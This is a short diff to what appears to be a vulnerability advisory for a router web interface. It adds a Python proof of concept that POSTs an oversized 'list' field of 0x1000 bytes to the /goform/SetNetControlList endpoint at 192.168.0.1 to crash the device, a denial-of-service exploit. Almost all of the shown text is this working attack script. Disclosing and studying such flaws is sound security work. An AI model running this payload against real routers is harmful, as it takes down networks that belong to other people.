@@ -25,3 +25,14 @@ So by POSTing the page `/goform/SetNetControlList` with long `list`, the attacke
 # POC
 
 Poc of Denial of Service(DoS):
+
+```python
+import requests
+
+url = "http://192.168.0.1/goform/SetNetControlList"
+list_data = 'a'*0x1000 + '\n'
+
+r = requests.post(url, data={'list': list_data})
+print(r.content)
+```
+
